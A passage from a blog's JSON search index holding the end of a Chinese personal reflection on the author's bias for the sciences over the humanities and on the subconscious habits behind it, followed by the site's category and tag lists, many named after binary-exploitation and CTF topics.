这里陷入了怪圈，先前说到我最终意识到认为理科酷而文科不酷是错误的，我意识到了但无法改正，然而代入上一个条件，矛盾产生了，我虽然意识到是我的观念有问题，但是我还是看不起与我观点不合的人。但是有时候这一点是成立的，比如我觉得每天坚持锻炼是一件特别好的事情，但是我无法做到，所以看到每天坚持锻炼的人，我会由衷地倾佩，脑子里并没有其他的杂念例如“这个人每天起来跑步肯定很浪费时间吧。” ​ “认为理科酷文科不酷”和“认为每天起床锻炼很好”都是非常表面的理念，但明明是看似类似的情况，但是结果却是截然不同的。 ​ 认为理科更酷，追溯其深层原因，大致是我从小对于文科更为擅长，然而初中以后就偏向理科，文科几乎没有学，所以对文科的深浅认识不够。同时又自觉智商太低，学不明白理科，所以认为理工科学霸就是比文科学霸强。 ​ 而认为每天起床锻炼很好，则是因为我本人很懒，不喜欢锻炼，但是又明白坚持锻炼延年益寿，所以非常羡慕那些能够坚持锻炼的人。 ​ 这里的差别有些微妙，大概前者来源于长达十几年的思维习惯，而后者只是一个纯粹的欲望驱使问题。 ​ 所以如何让我的潜意识也平等对待理科与文科？我现在很难回答这个问题，但是我已经逐渐地让我自己往这个方向上靠了，既然我自认为造成现状的原因是我认为文科简单理科难，那么就多接触文科，去挖掘文科的难点。 ​ 这个问题只是众多“观点相悖”中的一个微不足道的部分，对于这些部分的集合，我可以列举出无数个元素，例子没有必要举。 ​ 分析完元素的问题，集合的问题也就逐渐显现了。为什么我会轻视与我观点相悖的人？这个集合是否也是一个更大集合中微小的元素之一？ ​ 稍微想了一下，前者大致在于我作为一个独立个体，判断丈量事物的标准无论如何还是来源于我的大脑，我自己的思维习惯。换句话来说，我的潜意识思维习惯则是我大脑思考时没有任何负面部分的神明，是我之前提到过的抽象的美好，虽然从表层意识来看这完全不对。换句话来说，我的表层思维基于潜意识与理性，而潜意识无条件服从我大脑塑造时产生的思维习惯，我个人将这种思维习惯成为源意识。（随便取的） ​ 这样看来源意识是没有办法从当前或者更高的层级上来改变，我唯一能做的就是通过潜移默化来改变潜意识中的每一个元素，日积月累将我认为不健康的思维逐渐洗涤。 ​ 这里我没有提到懒惰。因为全部的主题都是基于看待他人，而不是看待自己。我感觉这里又是另外一层机制了，今天有点累，下次有机会再讲。 ​ ​","categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"}]}],"categories":[{"name":"AUDITION","slug":"AUDITION","permalink":"https://fuurinko.github.io/categories/AUDITION/"},{"name":"audition","slug":"audition","permalink":"https://fuurinko.github.io/categories/audition/"},{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/categories/qemu/"},{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"},{"name":"Race Condition","slug":"Race-Condition","permalink":"https://fuurinko.github.io/categories/Race-Condition/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/categories/Machine-Learning/"},{"name":"LLVM","slug":"LLVM","permalink":"https://fuurinko.github.io/categories/LLVM/"},{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"},{"name":"FUZZ_AFL","slug":"FUZZ-AFL","permalink":"https://fuurinko.github.io/categories/FUZZ-AFL/"},{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/categories/cve/"},{"name":"ucore","slug":"ucore","permalink":"https://fuurinko.github.io/categories/ucore/"},{"name":"KERNEL","slug":"KERNEL","permalink":"https://fuurinko.github.io/categories/KERNEL/"},{"name":"STACK - ROP","slug":"STACK-ROP","permalink":"https://fuurinko.github.io/categories/STACK-ROP/"},{"name":"HEAP - Fastbin Attack","slug":"HEAP-Fastbin-Attack","permalink":"https://fuurinko.github.io/categories/HEAP-Fastbin-Attack/"},{"name":"STACK - Shellcode","slug":"STACK-Shellcode","permalink":"https://fuurinko.github.io/categories/STACK-Shellcode/"},{"name":"STACK","slug":"STACK","permalink":"https://fuurinko.github.io/categories/STACK/"},{"name":"HEAP - ChunkOverlapping","slug":"HEAP-ChunkOverlapping","permalink":"https://fuurinko.github.io/categories/HEAP-ChunkOverlapping/"},{"name":"STACK - Canary","slug":"STACK-Canary","permalink":"https://fuurinko.github.io/categories/STACK-Canary/"},{"name":"Tcache","slug":"Tcache","permalink":"https://fuurinko.github.io/categories/Tcache/"},{"name":"STACK - ret2shellcode","slug":"STACK-ret2shellcode","permalink":"https://fuurinko.github.io/categories/STACK-ret2shellcode/"},{"name":"IO_FILE","slug":"IO-FILE","permalink":"https://fuurinko.github.io/categories/IO-FILE/"},{"name":"STACK - Other","slug":"STACK-Other","permalink":"https://fuurinko.github.io/categories/STACK-Other/"},{"name":"HEAP - sourcecode analysis","slug":"HEAP-sourcecode-analysis","permalink":"https://fuurinko.github.io/categories/HEAP-sourcecode-analysis/"},{"name":"HEAP - Tcache","slug":"HEAP-Tcache","permalink":"https://fuurinko.github.io/categories/HEAP-Tcache/"},{"name":"OTHER - IO FILE","slug":"OTHER-IO-FILE","permalink":"https://fuurinko.github.io/categories/OTHER-IO-FILE/"},{"name":"HEAP - House Of Orange","slug":"HEAP-House-Of-Orange","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Orange/"},{"name":"HEAP - Seccomp","slug":"HEAP-Seccomp","permalink":"https://fuurinko.github.io/categories/HEAP-Seccomp/"},{"name":"STACK - ret2dlreslove","slug":"STACK-ret2dlreslove","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlreslove/"},{"name":"PWN.COLLEGE","slug":"PWN-COLLEGE","permalink":"https://fuurinko.github.io/categories/PWN-COLLEGE/"},{"name":"HEAP - Unlink","slug":"HEAP-Unlink","permalink":"https://fuurinko.github.io/categories/HEAP-Unlink/"},{"name":"HEAP - Off By One","slug":"HEAP-Off-By-One","permalink":"https://fuurinko.github.io/categories/HEAP-Off-By-One/"},{"name":"HEAP - Heap overflow","slug":"HEAP-Heap-overflow","permalink":"https://fuurinko.github.io/categories/HEAP-Heap-overflow/"},{"name":"HEAP - House Of Force","slug":"HEAP-House-Of-Force","permalink":"https://fuurinko.github.io/categories/HEAP-House-Of-Force/"},{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"},{"name":"STACK - Format","slug":"STACK-Format","permalink":"https://fuurinko.github.io/categories/STACK-Format/"},{"name":"STACK - DynELF","slug":"STACK-DynELF","permalink":"https://fuurinko.github.io/categories/STACK-DynELF/"},{"name":"STACK - ARRAY OUT OF BOUNDS","slug":"STACK-ARRAY-OUT-OF-BOUNDS","permalink":"https://fuurinko.github.io/categories/STACK-ARRAY-OUT-OF-BOUNDS/"},{"name":"HEAP - Unsortedbin","slug":"HEAP-Unsortedbin","permalink":"https://fuurinko.github.io/categories/HEAP-Unsortedbin/"},{"name":"CSAPP LAB","slug":"CSAPP-LAB","permalink":"https://fuurinko.github.io/categories/CSAPP-LAB/"},{"name":"STACK - sandbox","slug":"STACK-sandbox","permalink":"https://fuurinko.github.io/categories/STACK-sandbox/"},{"name":"STACK - SROP","slug":"STACK-SROP","permalink":"https://fuurinko.github.io/categories/STACK-SROP/"},{"name":"STACK - ret2dlresolve","slug":"STACK-ret2dlresolve","permalink":"https://fuurinko.github.io/categories/STACK-ret2dlresolve/"}],"tags":[{"name":"幻想曲","slug":"幻想曲","permalink":"https://fuurinko.github.io/tags/%E5%B9%BB%E6%83%B3%E6%9B%B2/"},{"name":"万家灯火","slug":"万家灯火","permalink":"https://fuurinko.github.io/tags/%E4%B8%87%E5%AE%B6%E7%81%AF%E7%81%AB/"},{"name":"note","slug":"note","permalink":"https://fuurinko.github.io/tags/note/"},{"name":"qemu","slug":"qemu","permalink":"https://fuurinko.github.io/tags/qemu/"},{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"},{"name":"xctf","slug":"xctf","permalink":"https://fuurinko.github.io/tags/xctf/"},{"name":"Machine Learning","slug":"Machine-Learning","permalink":"https://fuurinko.github.io/tags/Machine-Learning/"},{"name":"ciscn","slug":"ciscn","permalink":"https://fuurinko.github.io/tags/ciscn/"},{"name":"GDB","slug":"GDB","permalink":"https://fuurinko.github.io/tags/GDB/"},{"name":"sum","slug":"sum","permalink":"https://fuurinko.github.io/tags/sum/"},{"name":"FUZZ","slug":"FUZZ","permalink":"https://fuurinko.github.io/tags/FUZZ/"},{"name":"vivi","slug":"vivi","permalink":"https://fuurinko.github.io/tags/vivi/"},{"name":"cve","slug":"cve","permalink":"https://fuurinko.github.io/tags/cve/"},{"name":"os","slug":"os","permalink":"https://fuurinko.github.io/tags/os/"},{"name":"KERNEL","slug":"KERNEL","permalink":"https://fuurinko.github.io/tags/KERNEL/"},{"name":"pwnable","slug":"pwnable","permalink":"https://fuurinko.github.io/tags/pwnable/"},{"name":"learning","slug":"learning","permalink":"https://fuurinko.github.io/tags/learning/"},{"name":"starctf","slug":"starctf","permalink":"https://fuurinko.github.io/tags/starctf/"},{"name":"源码分析","slug":"源码分析","permalink":"https://fuurinko.github.io/tags/%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"},{"name":"io_file","slug":"io-file","permalink":"https://fuurinko.github.io/tags/io-file/"},{"name":"pwncollege","slug":"pwncollege","permalink":"https://fuurinko.github.io/tags/pwncollege/"},{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"},{"name":"heap","slug":"heap","permalink":"https://fuurinko.github.io/tags/heap/"},{"name":"Chunk Overlapping","slug":"Chunk-Overlapping","permalink":"https://fuurinko.github.io/tags/Chunk-Overlapping/"},{"name":"hof","slug":"hof","permalink":"https://fuurinko.github.io/tags/hof/"},{"name":"UAF","slug":"UAF","permalink":"https://fuurinko.github.io/tags/UAF/"},{"name":"stack","slug":"stack","permalink":"https://fuurinko.github.io/tags/stack/"},{"name":"ret2csu","slug":"ret2csu","permalink":"https://fuurinko.github.io/tags/ret2csu/"},{"name":"FMT","slug":"FMT","permalink":"https://fuurinko.github.io/tags/FMT/"},{"name":"DynELF","slug":"DynELF","permalink":"https://fuurinko.github.io/tags/DynELF/"},{"name":"ret2gadgets","slug":"ret2gadgets","permalink":"https://fuurinko.github.io/tags/ret2gadgets/"},{"name":"cisin","slug":"cisin","permalink":"https://fuurinko.github.io/tags/cisin/"},{"name":"逆向","slug":"逆向","permalink":"https://fuurinko.github.io/tags/%E9%80%86%E5%90%91/"},{"name":"csapp lab","slug":"csapp-lab","permalink":"https://fuurinko.github.io/tags/csapp-lab/"},{"name":"SRE","slug":"SRE","permalink":"https://fuurinko.github.io/tags/SRE/"},{"name":"linux primary","slug":"linux-primary","permalink":"https://fuurinko.github.io/tags/linux-primary/"},{"name":"gdb","slug":"gdb","permalink":"https://fuurinko.github.io/tags/gdb/"},{"name":"assemble","slug":"assemble","permalink":"https://fuurinko.github.io/tags/assemble/"},{"name":"深夜高速","slug":"深夜高速","permalink":"https://fuurinko.github.io/tags/%E6%B7%B1%E5%A4%9C%E9%AB%98%E9%80%9F/"}]}